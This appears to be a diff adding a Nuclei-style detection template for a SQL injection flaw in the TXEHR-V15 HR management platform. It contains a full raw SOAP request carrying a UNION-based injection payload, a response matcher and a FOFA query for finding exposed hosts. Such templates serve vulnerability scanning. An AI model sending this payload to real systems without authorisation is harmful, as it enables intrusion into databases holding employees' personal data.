@@ -1,0 +1,35 @@
+id: txehr-v15-sqli
+
+info:
+  name: TXEHR-V15 - SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template is designed to identify potential SQL injection vulnerabilities in SOAP-based web services by injecting a payload and checking for a specific response pattern.
+  metadata:
+    fofa: body="/Assistant/Default.aspx"
+  tags: 同享TXEHR-V15人力管理管理平台
+
+http:
+  - raw:
+      - |
+        POST /Service/EmployeeInfoService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+          <soapenv:Body>
+              <tem:GetEmployeeByCardNo>
+                <!--type: string-->
+                <tem:strCardNo>1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(113)+CHAR(112)+CHAR(67)+CHAR(71)+CHAR(99)+CHAR(84)+CHAR(70)+CHAR(73)+CHAR(110)+CHAR(110)+CHAR(97)+CHAR(70)+CHAR(108)+CHAR(113)+CHAR(98)+CHAR(99)+CHAR(108)+CHAR(85)+CHAR(117)+CHAR(97)+CHAR(108)+CHAR(72)+CHAR(66)+CHAR(75)+CHAR(82)+CHAR(69)+CHAR(113)+CHAR(116)+CHAR(120)+CHAR(72)+CHAR(115)+CHAR(78)+CHAR(113)+CHAR(65)+CHAR(117)+CHAR(80)+CHAR(110)+CHAR(102)+CHAR(112)+CHAR(90)+CHAR(111)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(107)+CHAR(113)-- HxKT</tem:strCardNo>
+              </tem:GetEmployeeByCardNo>
+          </soapenv:Body>
+        </soapenv:Envelope>
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qqjpqpCGcTFInnaFlqbclUualHBKREqtxHsNqAuPnfpZoqvzkq"
+        part: body
